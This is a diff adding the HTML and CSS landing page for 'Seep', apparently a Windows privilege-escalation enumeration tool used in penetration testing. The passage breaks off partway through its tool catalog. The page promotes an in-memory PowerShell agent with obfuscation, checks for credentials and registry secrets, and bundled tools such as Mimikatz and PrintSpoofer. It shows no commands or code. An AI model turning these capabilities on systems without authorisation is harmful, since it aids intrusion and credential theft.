@@ -1,0 +1,1346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Seep — Water Finds Every Crack</title>
+  <meta name="description" content="Windows privilege escalation enumeration framework. 16 checks, 97 tools, MITRE ATT&CK-mapped recommendations, fileless agent, and single-file HTML reports.">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Ctext y='26' font-size='26'%3E%F0%9F%92%A7%3C/text%3E%3C/svg%3E">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
+  <style>
+    /* =========================================================
+       SEEP LANDING PAGE
+       Catppuccin Mocha palette — dark terminal aesthetic
+       ========================================================= */
+
+    *, *::before, *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --ctp-rosewater: #f5e0dc;
+      --ctp-flamingo: #f2cdcd;
+      --ctp-pink: #f5c2e7;
+      --ctp-mauve: #cba6f7;
+      --ctp-red: #f38ba8;
+      --ctp-maroon: #eba0ac;
+      --ctp-peach: #fab387;
+      --ctp-yellow: #f9e2af;
+      --ctp-green: #a6e3a1;
+      --ctp-teal: #94e2d5;
+      --ctp-sky: #89dceb;
+      --ctp-sapphire: #74c7ec;
+      --ctp-blue: #89b4fa;
+      --ctp-lavender: #b4befe;
+      --ctp-text: #cdd6f4;
+      --ctp-subtext1: #bac2de;
+      --ctp-subtext0: #a6adc8;
+      --ctp-overlay2: #9399b2;
+      --ctp-overlay1: #7f849c;
+      --ctp-overlay0: #6c7086;
+      --ctp-surface2: #585b70;
+      --ctp-surface1: #45475a;
+      --ctp-surface0: #313244;
+      --ctp-base: #1e1e2e;
+      --ctp-mantle: #181825;
+      --ctp-crust: #11111b;
+    }
+
+    html {
+      scroll-behavior: smooth;
+      scrollbar-width: thin;
+      scrollbar-color: var(--ctp-surface1) var(--ctp-crust);
+    }
+
+    body {
+      font-family: 'JetBrains Mono', monospace;
+      background-color: var(--ctp-crust);
+      color: var(--ctp-text);
+      line-height: 1.7;
+      font-size: 15px;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    /* ---- Dot-grid background pattern ---- */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image: radial-gradient(var(--ctp-surface0) 1px, transparent 1px);
+      background-size: 24px 24px;
+      opacity: 0.3;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* ---- CRT scanline overlay ---- */
+    body::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0, 0, 0, 0.03) 2px,
+        rgba(0, 0, 0, 0.03) 4px
+      );
+      pointer-events: none;
+      z-index: 9999;
+    }
+
+    /* ---- Layout ---- */
+    .page-wrap {
+      position: relative;
+      z-index: 1;
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 0 24px;
+    }
+
+    section {
+      margin-bottom: 96px;
+    }
+
+    a {
+      color: var(--ctp-sapphire);
+      text-decoration: none;
+      transition: color 0.2s;
+    }
+
+    a:hover {
+      color: var(--ctp-sky);
+    }
+
+    /* ---- Section titles ---- */
+    .section-label {
+      display: inline-block;
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color: var(--ctp-overlay0);
+      border: 1px solid var(--ctp-surface1);
+      padding: 4px 12px;
+      border-radius: 2px;
+      margin-bottom: 20px;
+    }
+
+    .section-title {
+      font-size: clamp(22px, 3vw, 30px);
+      font-weight: 700;
+      color: var(--ctp-text);
+      margin-bottom: 12px;
+      line-height: 1.3;
+    }
+
+    .section-desc {
+      color: var(--ctp-subtext0);
+      font-size: 14px;
+      max-width: 600px;
+      margin-bottom: 40px;
+    }
+
+    /* =========================================================
+       HERO
+       ========================================================= */
+    .hero {
+      padding: 80px 0 48px;
+      text-align: center;
+      margin-bottom: 64px;
+    }
+
+    .hero-terminal {
+      border: 1px solid var(--ctp-surface1);
+      border-radius: 8px;
+      background: var(--ctp-mantle);
+      max-width: 780px;
+      margin: 0 auto;
+      overflow: hidden;
+      box-shadow:
+        0 0 0 1px var(--ctp-surface0),
+        0 24px 80px -12px rgba(0, 0, 0, 0.6),
+        0 0 120px -40px rgba(148, 226, 213, 0.08);
+    }
+
+    .hero-titlebar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 12px 16px;
+      background: var(--ctp-crust);
+      border-bottom: 1px solid var(--ctp-surface0);
+    }
+
+    .hero-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+    }
+
+    .hero-dot--red { background: var(--ctp-red); }
+    .hero-dot--yellow { background: var(--ctp-yellow); }
+    .hero-dot--green { background: var(--ctp-green); }
+
+    .hero-titlebar-text {
+      flex: 1;
+      text-align: center;
+      font-size: 12px;
+      color: var(--ctp-overlay0);
+      letter-spacing: 0.05em;
+    }
+
+    .hero-body {
+      padding: 48px 40px 56px;
+    }
+
+    .hero-prompt {
+      font-size: 13px;
+      color: var(--ctp-overlay0);
+      margin-bottom: 24px;
+      letter-spacing: 0.02em;
+    }
+
+    .hero-prompt .prompt-symbol {
+      color: var(--ctp-green);
+    }
+
+    .hero-prompt .prompt-path {
+      color: var(--ctp-blue);
+    }
+
+    .hero-title {
+      font-size: clamp(42px, 7vw, 72px);
+      font-weight: 700;
+      letter-spacing: -0.03em;
+      line-height: 1.05;
+      margin-bottom: 8px;
+      background: linear-gradient(
+        135deg,
+        var(--ctp-teal) 0%,
+        var(--ctp-sapphire) 35%,
+        var(--ctp-blue) 65%,
+        var(--ctp-mauve) 100%
+      );
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      filter: drop-shadow(0 0 40px rgba(148, 226, 213, 0.2));
+    }
+
+    .hero-cursor {
+      display: inline-block;
+      width: 3px;
+      height: 0.8em;
+      background: var(--ctp-teal);
+      margin-left: 4px;
+      vertical-align: baseline;
+      animation: blink 1s step-end infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+
+    .hero-tagline {
+      font-size: clamp(14px, 2vw, 17px);
+      color: var(--ctp-subtext0);
+      margin-bottom: 36px;
+      font-weight: 400;
+      line-height: 1.6;
+    }
+
+    .hero-tagline em {
+      color: var(--ctp-subtext1);
+      font-style: normal;
+    }
+
+    .hero-stats {
+      display: flex;
+      justify-content: center;
+      gap: 32px;
+      margin-bottom: 36px;
+      flex-wrap: wrap;
+    }
+
+    .hero-stat {
+      text-align: center;
+    }
+
+    .hero-stat-value {
+      font-size: 28px;
+      font-weight: 700;
+      line-height: 1.2;
+    }
+
+    .hero-stat:nth-child(1) .hero-stat-value { color: var(--ctp-teal); }
+    .hero-stat:nth-child(2) .hero-stat-value { color: var(--ctp-blue); }
+    .hero-stat:nth-child(3) .hero-stat-value { color: var(--ctp-mauve); }
+
+    .hero-stat-label {
+      font-size: 11px;
+      color: var(--ctp-overlay1);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+    }
+
+    .hero-buttons {
+      display: flex;
+      gap: 16px;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 12px 28px;
+      border-radius: 4px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 14px;
+      font-weight: 500;
+      letter-spacing: 0.02em;
+      border: 1px solid transparent;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-decoration: none;
+    }
+
+    .btn-primary {
+      background: var(--ctp-teal);
+      color: var(--ctp-crust);
+      border-color: var(--ctp-teal);
+    }
+
+    .btn-primary:hover {
+      background: var(--ctp-sky);
+      border-color: var(--ctp-sky);
+      color: var(--ctp-crust);
+      box-shadow: 0 0 24px rgba(148, 226, 213, 0.25);
+    }
+
+    .btn-ghost {
+      background: transparent;
+      color: var(--ctp-subtext1);
+      border-color: var(--ctp-surface1);
+    }
+
+    .btn-ghost:hover {
+      color: var(--ctp-text);
+      border-color: var(--ctp-overlay0);
+      background: var(--ctp-surface0);
+    }
+
+    /* =========================================================
+       FEATURES GRID
+       ========================================================= */
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 16px;
+    }
+
+    .feature-card {
+      background: var(--ctp-mantle);
+      border: 1px solid var(--ctp-surface0);
+      border-radius: 6px;
+      padding: 28px 24px;
+      transition: all 0.25s;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .feature-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, var(--ctp-teal), transparent);
+      opacity: 0;
+      transition: opacity 0.3s;
+    }
+
+    .feature-card:hover {
+      border-color: var(--ctp-surface1);
+      background: var(--ctp-base);
+      transform: translateY(-2px);
+      box-shadow: 0 8px 32px -8px rgba(0, 0, 0, 0.4);
+    }
+
+    .feature-card:hover::before {
+      opacity: 1;
+    }
+
+    .feature-icon {
+      font-size: 24px;
+      margin-bottom: 16px;
+      display: block;
+      width: 44px;
+      height: 44px;
+      line-height: 44px;
+      text-align: center;
+      background: var(--ctp-surface0);
+      border-radius: 8px;
+      border: 1px solid var(--ctp-surface1);
+    }
+
+    .feature-card h3 {
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--ctp-text);
+      margin-bottom: 8px;
+    }
+
+    .feature-card p {
+      font-size: 13px;
+      color: var(--ctp-subtext0);
+      line-height: 1.6;
+    }
+
+    .feature-card:nth-child(1):hover { border-color: var(--ctp-teal); }
+    .feature-card:nth-child(1):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-teal), transparent); }
+
+    .feature-card:nth-child(2):hover { border-color: var(--ctp-sapphire); }
+    .feature-card:nth-child(2):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-sapphire), transparent); }
+
+    .feature-card:nth-child(3):hover { border-color: var(--ctp-blue); }
+    .feature-card:nth-child(3):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-blue), transparent); }
+
+    .feature-card:nth-child(4):hover { border-color: var(--ctp-mauve); }
+    .feature-card:nth-child(4):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-mauve), transparent); }
+
+    .feature-card:nth-child(5):hover { border-color: var(--ctp-green); }
+    .feature-card:nth-child(5):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-green), transparent); }
+
+    .feature-card:nth-child(6):hover { border-color: var(--ctp-peach); }
+    .feature-card:nth-child(6):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-peach), transparent); }
+
+    .feature-card:nth-child(7):hover { border-color: var(--ctp-yellow); }
+    .feature-card:nth-child(7):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-yellow), transparent); }
+
+    .feature-card:nth-child(8):hover { border-color: var(--ctp-flamingo); }
+    .feature-card:nth-child(8):hover::before { background: linear-gradient(90deg, transparent, var(--ctp-flamingo), transparent); }
+
+    /* =========================================================
+       AGENT CHECKS
+       ========================================================= */
+    .capabilities-section {
+      text-align: center;
+    }
+
+    .capabilities-terminal {
+      border: 1px solid var(--ctp-surface1);
+      border-radius: 8px;
+      overflow: hidden;
+      background: var(--ctp-mantle);
+      box-shadow:
+        0 0 0 1px var(--ctp-surface0),
+        0 32px 80px -16px rgba(0, 0, 0, 0.5),
+        0 0 160px -60px rgba(148, 226, 213, 0.06);
+      max-width: 1000px;
+      margin: 0 auto;
+    }
+
+    .capabilities-titlebar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 16px;
+      background: var(--ctp-crust);
+      border-bottom: 1px solid var(--ctp-surface0);
+    }
+
+    .capabilities-titlebar-text {
+      flex: 1;
+      text-align: center;
+      font-size: 12px;
+      color: var(--ctp-overlay0);
+    }
+
+    .capabilities-body {
+      padding: 32px;
+    }
+
+    .capabilities-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+      gap: 10px;
+      margin-bottom: 24px;
+    }
+
+    .capability-pill {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 14px;
+      border: 1px solid var(--ctp-surface0);
+      border-radius: 4px;
+      background: var(--ctp-base);
+      font-size: 13px;
+      color: var(--ctp-subtext1);
+      transition: all 0.2s;
+    }
+
+    .capability-pill:hover {
+      border-color: var(--ctp-surface2);
+      background: var(--ctp-surface0);
+    }
+
+    .capability-pill .detail {
+      font-size: 11px;
+      color: var(--ctp-overlay0);
+      margin-left: auto;
+    }
+
+    .capability-pill .dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+
+    .dot--system { background: var(--ctp-teal); }
+    .dot--creds { background: var(--ctp-red); }
+    .dot--services { background: var(--ctp-blue); }
+    .dot--config { background: var(--ctp-peach); }
+    .dot--recon { background: var(--ctp-green); }
+    .dot--registry { background: var(--ctp-mauve); }
+
+    .capabilities-legend {
+      display: flex;
+      justify-content: center;
+      gap: 24px;
+      flex-wrap: wrap;
+      font-size: 12px;
+      color: var(--ctp-overlay1);
+    }
+
+    .capabilities-legend span {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    /* =========================================================
+       ARCHITECTURE
+       ========================================================= */
+    .arch-terminal {
+      border: 1px solid var(--ctp-surface1);
+      border-radius: 8px;
+      overflow: hidden;
+      background: var(--ctp-mantle);
+      box-shadow: 0 16px 48px -12px rgba(0, 0, 0, 0.4);
+    }
+
+    .arch-titlebar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 16px;
+      background: var(--ctp-crust);
+      border-bottom: 1px solid var(--ctp-surface0);
+    }
+
+    .arch-titlebar-text {
+      flex: 1;
+      text-align: center;
+      font-size: 12px;
+      color: var(--ctp-overlay0);
+    }
+
+    .arch-body {
+      padding: 32px;
+    }
+
+    .arch-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 24px;
+    }
+
+    .arch-item {
+      padding: 20px;
+      border: 1px solid var(--ctp-surface0);
+      border-radius: 4px;
+      background: var(--ctp-base);
+    }
+
+    .arch-item-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
+
+    .arch-item-marker {
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--ctp-crust);
+      background: var(--ctp-teal);
+      width: 24px;
+      height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 3px;
+      flex-shrink: 0;
+    }
+
+    .arch-item:nth-child(2) .arch-item-marker { background: var(--ctp-sapphire); }
+    .arch-item:nth-child(3) .arch-item-marker { background: var(--ctp-blue); }
+    .arch-item:nth-child(4) .arch-item-marker { background: var(--ctp-mauve); }
+
+    .arch-item h3 {
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--ctp-text);
+    }
+
+    .arch-item p {
+      font-size: 13px;
+      color: var(--ctp-subtext0);
+      line-height: 1.6;
+    }
+
+    .arch-item code {
+      font-size: 12px;
+      color: var(--ctp-teal);
+      background: var(--ctp-surface0);
+      padding: 1px 6px;
+      border-radius: 3px;
+    }
+
+    .arch-divider {
+      border: none;
+      border-top: 1px dashed var(--ctp-surface1);
+      margin: 28px 0;
+    }
+
+    .arch-stack {
+      font-size: 13px;
+      color: var(--ctp-subtext0);
+      text-align: center;
+    }
+
+    .arch-stack span {
+      display: inline-block;
+      padding: 4px 14px;
+      border: 1px solid var(--ctp-surface1);
+      border-radius: 3px;
+      margin: 4px;
+      background: var(--ctp-base);
+      color: var(--ctp-subtext1);
+      font-size: 12px;
+    }
+
+    /* =========================================================
+       TOOL CATALOG
+       ========================================================= */
+    .catalog-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+      gap: 12px;
+    }
+
+    .catalog-card {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 16px 18px;
+      border: 1px solid var(--ctp-surface0);
+      border-radius: 6px;
+      background: var(--ctp-mantle);
+      transition: all 0.2s;
+    }
+
+    .catalog-card:hover {
+      border-color: var(--ctp-surface1);
+      background: var(--ctp-base);
+    }
+
+    .catalog-count {
+      font-size: 22px;
+      font-weight: 700;
+      min-width: 36px;
+      text-align: center;
+    }
+
+    .catalog-info h3 {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--ctp-text);
+      margin-bottom: 2px;
+    }
+
+    .catalog-info p {
+      font-size: 12px;
+      color: var(--ctp-overlay1);
+    }
+
+    /* =========================================================
+       GETTING STARTED
+       ========================================================= */
+    .start-row {
+      display: flex;
+      gap: 40px;
+      align-items: flex-start;
+    }
+
+    .start-terminal {
+      border: 1px solid var(--ctp-surface1);
+      border-radius: 8px;
+      overflow: hidden;
+      background: var(--ctp-mantle);
+      box-shadow: 0 16px 48px -12px rgba(0, 0, 0, 0.4);
+      flex: 1;
+      min-width: 0;
+    }
+
+    .start-titlebar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 16px;
+      background: var(--ctp-crust);
+      border-bottom: 1px solid var(--ctp-surface0);
+    }
+
+    .start-titlebar-text {
+      flex: 1;
+      text-align: center;
+      font-size: 12px;
+      color: var(--ctp-overlay0);
+    }
+
+    .start-body {
+      padding: 28px 32px;
+    }
+
+    .start-line {
+      margin-bottom: 4px;
+      font-size: 14px;
+      line-height: 1.8;
+    }
+
+    .start-line .prompt {
+      color: var(--ctp-green);
+      user-select: none;
+    }
+
+    .start-line .cmd {
+      color: var(--ctp-text);
+    }
+
+    .start-line .comment {
+      color: var(--ctp-overlay0);
+    }
+
+    .start-line .flag {
+      color: var(--ctp-peach);
+    }
+
+    .start-line .arg {
+      color: var(--ctp-yellow);
+    }
+
+    .start-info {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .start-info p {
+      font-size: 14px;
+      color: var(--ctp-subtext0);
+      margin-bottom: 12px;
+      line-height: 1.7;
+    }
+
+    .start-info code {
+      font-size: 13px;
+      color: var(--ctp-peach);
+      background: var(--ctp-surface0);
+      padding: 2px 8px;
+      border-radius: 3px;
+      border: 1px solid var(--ctp-surface1);
+    }
+
+    /* =========================================================
+       USAGE EXAMPLES
+       ========================================================= */
+    .usage-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 16px;
+    }
+
+    .usage-card {
+      border: 1px solid var(--ctp-surface0);
+      border-radius: 6px;
+      background: var(--ctp-mantle);
+      overflow: hidden;
+    }
+
+    .usage-card-header {
+      padding: 12px 16px;
+      background: var(--ctp-crust);
+      border-bottom: 1px solid var(--ctp-surface0);
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--ctp-subtext1);
+      letter-spacing: 0.05em;
+    }
+
+    .usage-card-body {
+      padding: 16px 20px;
+    }
+
+    .usage-card-body .start-line {
+      font-size: 13px;
+      line-height: 1.7;
+      margin-bottom: 2px;
+    }
+
+    /* =========================================================
+       FOOTER
+       ========================================================= */
+    .site-footer {
+      border-top: 1px solid var(--ctp-surface0);
+      padding: 48px 0;
+      text-align: center;
+      margin-top: 32px;
+    }
+
+    .footer-tagline {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--ctp-subtext1);
+      margin-bottom: 24px;
+      letter-spacing: 0.02em;
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      gap: 32px;
+      margin-bottom: 28px;
+      flex-wrap: wrap;
+    }
+
+    .footer-links a {
+      font-size: 13px;
+      color: var(--ctp-overlay1);
+      transition: color 0.2s;
+    }
+
+    .footer-links a:hover {
+      color: var(--ctp-teal);
+    }
+
+    .footer-copy {
+      font-size: 12px;
+      color: var(--ctp-overlay0);
+    }
+
+    /* =========================================================
+       RESPONSIVE
+       ========================================================= */
+    @media (max-width: 900px) {
+      .features-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+      .arch-grid {
+        grid-template-columns: 1fr;
+      }
+      .usage-grid {
+        grid-template-columns: 1fr;
+      }
+      .hero-body {
+        padding: 36px 24px 44px;
+      }
+      .start-row {
+        flex-direction: column;
+        gap: 24px;
+      }
+      .hero-stats {
+        gap: 24px;
+      }
+    }
+
+    @media (max-width: 600px) {
+      body {
+        font-size: 14px;
+      }
+      .page-wrap {
+        padding: 0 16px;
+      }
+      .features-grid {
+        grid-template-columns: 1fr;
+      }
+      .capabilities-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+      .catalog-grid {
+        grid-template-columns: 1fr;
+      }
+      section {
+        margin-bottom: 64px;
+      }
+      .hero {
+        padding: 48px 0 32px;
+      }
+      .hero-body {
+        padding: 28px 20px 36px;
+      }
+      .hero-buttons {
+        flex-direction: column;
+        align-items: center;
+      }
+      .btn {
+        width: 100%;
+        max-width: 260px;
+        justify-content: center;
+      }
+      .arch-body {
+        padding: 20px;
+      }
+      .start-body {
+        padding: 20px;
+      }
+      .start-line {
+        font-size: 12px;
+      }
+      .feature-card {
+        padding: 22px 20px;
+      }
+    }
+
+    /* ---- Selection highlight ---- */
+    ::selection {
+      background: rgba(148, 226, 213, 0.25);
+      color: var(--ctp-text);
+    }
+
+    /* ---- Focus styles for accessibility ---- */
+    a:focus-visible,
+    .btn:focus-visible {
+      outline: 2px solid var(--ctp-teal);
+      outline-offset: 2px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="page-wrap">
+
+  <!-- ============ HERO ============ -->
+  <section class="hero" id="top">
+    <div class="hero-terminal">
+      <div class="hero-titlebar">
+        <span class="hero-dot hero-dot--red"></span>
+        <span class="hero-dot hero-dot--yellow"></span>
+        <span class="hero-dot hero-dot--green"></span>
+        <span class="hero-titlebar-text">seep -- windows privesc enumeration</span>
+      </div>
+      <div class="hero-body">
+        <h1 class="hero-title">Seep<span class="hero-cursor" aria-hidden="true"></span></h1>
+        <p class="hero-tagline">
+          <em>Water finds every crack.</em><br>
+          Windows privilege escalation enumeration framework
+        </p>
+        <div class="hero-stats">
+          <div class="hero-stat">
+            <div class="hero-stat-value">16</div>
+            <div class="hero-stat-label">Checks</div>
+          </div>
+          <div class="hero-stat">
+            <div class="hero-stat-value">97</div>
+            <div class="hero-stat-label">Tools</div>
+          </div>
+          <div class="hero-stat">
+            <div class="hero-stat-value">7</div>
+            <div class="hero-stat-label">Categories</div>
+          </div>
+        </div>
+        <div class="hero-buttons">
+          <a href="#getting-started" class="btn btn-primary">Get Started</a>
+          <a href="https://github.com/Real-Fruit-Snacks/Seep" class="btn btn-ghost">View on GitHub</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ FEATURES ============ -->
+  <section id="features">
+    <span class="section-label">// capabilities</span>
+    <h2 class="section-title">Enumerate. Analyze. Escalate.</h2>
+    <p class="section-desc">
+      A fileless PowerShell agent surveys the target, uploads structured findings, and generates MITRE ATT&CK-mapped reports with actionable exploitation guidance.
+    </p>
+
+    <div class="features-grid">
+      <div class="feature-card">
+        <span class="feature-icon" aria-hidden="true">&#128171;</span>
+        <h3>Fileless Agent</h3>
+        <p>IEX cradle downloads and executes in memory. Results are GZip-compressed and uploaded over HTTP. Zero disk footprint on the target.</p>
+      </div>
+
+      <div class="feature-card">
+        <span class="feature-icon" aria-hidden="true">&#128270;</span>
+        <h3>16 Enumeration Checks</h3>
+        <p>Token privileges, unquoted service paths, saved credentials, autoruns, DLL hijack candidates, registry secrets &mdash; all producing structured JSON findings.</p>
+      </div>
+
+      <div class="feature-card">
+        <span class="feature-icon" aria-hidden="true">&#127919;</span>
+        <h3>MITRE ATT&CK Mapping</h3>
+        <p>Every finding maps to ATT&CK techniques with tool suggestions, example commands, and risk ratings sorted by severity.</p>
+      </div>
+
+      <div class="feature-card">
+        <span class="feature-icon" aria-hidden="true">&#128230;</span>
+        <h3>97-Tool Catalog</h3>
+        <p>Organized across 7 categories with SHA256 integrity verification and self-hosted distribution via GitHub Releases. No upstream URL rot.</p>
+      </div>
+
+      <div class="feature-card">
+        <span class="feature-icon" aria-hidden="true">&#128196;</span>
+        <h3>HTML Reports</h3>
+        <p>Dark-themed, self-contained HTML. Executive summary, severity donut, per-finding evidence, remediation guidance. Zero CDN dependencies.</p>
+      </div>
+
+      <div class="feature-card">
+        <span class="feature-icon" aria-hidden="true">&#9881;</span>
+        <h3>Modular Composer</h3>
+        <p>Cherry-pick checks with <code style="font-size:12px;color:var(--ctp-teal);background:var(--ctp-surface0);padding:1px 5px;border-radius:3px;">--checks</code> / <code style="font-size:12px;color:var(--ctp-teal);background:var(--ctp-surface0);padding:1px 5px;border-radius:3px;">--exclude</code>. Apply string obfuscation. Strip comments. One composable agent.</p>
+      </div>
+
+      <div class="feature-card">
+        <span class="feature-icon" aria-hidden="true">&#128274;</span>
+        <h3>TLS &amp; Hardened Server</h3>
+        <p>Self-signed HTTPS, upload size limits, decompression bomb protection, XSS-safe HTML, path traversal guards, and CSP headers.</p>
+      </div>
+
+      <div class="feature-card">
+        <span class="feature-icon" aria-hidden="true">&#128202;</span>
+        <h3>Multi-Format Output</h3>
+        <p>HTML, Markdown, and JSON reports from a single result set. Pipe JSON to jq for scripted workflows. MITRE URLs and tool download links included.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ AGENT CHECKS ============ -->
+  <section class="capabilities-section" id="checks">
+    <span class="section-label">// agent checks</span>
+    <h2 class="section-title">16 checks. Full coverage.</h2>
+    <p class="section-desc" style="margin-left:auto;margin-right:auto;">
+      Every check runs independently, produces structured JSON findings with severity ratings, and feeds the recommendation engine.
+    </p>
+
+    <div class="capabilities-terminal">
+      <div class="capabilities-titlebar">
+        <span class="hero-dot hero-dot--red"></span>
+        <span class="hero-dot hero-dot--yellow"></span>
+        <span class="hero-dot hero-dot--green"></span>
+        <span class="capabilities-titlebar-text">seep compose --list -- agent checks</span>
+      </div>
+      <div class="capabilities-body">
+        <div class="capabilities-grid">
+          <div class="capability-pill"><span class="dot dot--system"></span> System Info <span class="detail">low</span></div>
+          <div class="capability-pill"><span class="dot dot--system"></span> User Privileges <span class="detail">low</span></div>
+          <div class="capability-pill"><span class="dot dot--recon"></span> Network <span class="detail">low</span></div>
+          <div class="capability-pill"><span class="dot dot--recon"></span> Patches <span class="detail">low</span></div>
+          <div class="capability-pill"><span class="dot dot--creds"></span> Quick Wins <span class="detail">low</span></div>
+          <div class="capability-pill"><span class="dot dot--creds"></span> Unattend Files <span class="detail">med</span></div>
+          <div class="capability-pill"><span class="dot dot--creds"></span> Web Configs <span class="detail">med</span></div>
+          <div class="capability-pill"><span class="dot dot--services"></span> Services <span class="detail">low</span></div>
+          <div class="capability-pill"><span class="dot dot--services"></span> Scheduled Tasks <span class="detail">low</span></div>
+          <div class="capability-pill"><span class="dot dot--services"></span> Autoruns <span class="detail">low</span></div>
+          <div class="capability-pill"><span class="dot dot--config"></span> AlwaysInstallElev <span class="detail">low</span></div>
+          <div class="capability-pill"><span class="dot dot--recon"></span> Software <span class="detail">low</span></div>
+          <div class="capability-pill"><span class="dot dot--recon"></span> Processes <span class="detail">low</span></div>
+          <div class="capability-pill"><span class="dot dot--config"></span> DLL Hijack <span class="detail">med</span></div>
+          <div class="capability-pill"><span class="dot dot--recon"></span> Directory Tree <span class="detail">low</span></div>
+          <div class="capability-pill"><span class="dot dot--registry"></span> Registry Secrets <span class="detail">low</span></div>
+        </div>
+        <div class="capabilities-legend">
+          <span><span class="dot dot--system" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> System</span>
+          <span><span class="dot dot--creds" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Credentials</span>
+          <span><span class="dot dot--services" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Services</span>
+          <span><span class="dot dot--config" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Configuration</span>
+          <span><span class="dot dot--recon" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Recon</span>
+          <span><span class="dot dot--registry" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Registry</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ TOOL CATALOG ============ -->
+  <section id="catalog">
+    <span class="section-label">// tool catalog</span>
+    <h2 class="section-title">97 tools. 7 categories.</h2>
+    <p class="section-desc">
+      Self-hosted via GitHub Releases with SHA256 integrity verification, concurrent downloads, and automatic symlink organization.
+    </p>
+
+    <div class="catalog-grid">
+      <div class="catalog-card">
+        <div class="catalog-count" style="color:var(--ctp-teal);">17</div>
+        <div class="catalog-info">
+          <h3>Enumeration</h3>
+          <p>WinPEAS, SharpUp, Seatbelt, Watson</p>
+        </div>
+      </div>
+      <div class="catalog-card">
+        <div class="catalog-count" style="color:var(--ctp-red);">12</div>
+        <div class="catalog-info">
+          <h3>Credentials</h3>
+          <p>Mimikatz, LaZagne, SharpDPAPI, Rubeus</p>
+        </div>
+      </div>
+      <div class="catalog-card">
+        <div class="catalog-count" style="color:var(--ctp-peach);">14</div>
+        <div class="catalog-info">
+          <h3>TokenAbuse</h3>
+          <p>PrintSpoofer, GodPotato, JuicyPotato</p>
+        </div>
+      </div>
+      <div class="catalog-card">
+        <div class="catalog-count" style="color:var(--ctp-blue);">14</div>
+        <div class="catalog-info">
+          <h3>Active Directory</h3>
+          <p>SharpHound, RustHound, Certify, Whisker</p>
+        </div>
+      </div>
+      <div class="catalog-card">
+        <div class="catalog-count" style="color:var(--ctp-green);">8</div>
+        <div class="catalog-info">
+          <h3>Tunneling</h3>
+          <p>Chisel, Ligolo-ng, socat, netcat</p>
+        </div>
+      </div>
+      <div class="catalog-card">
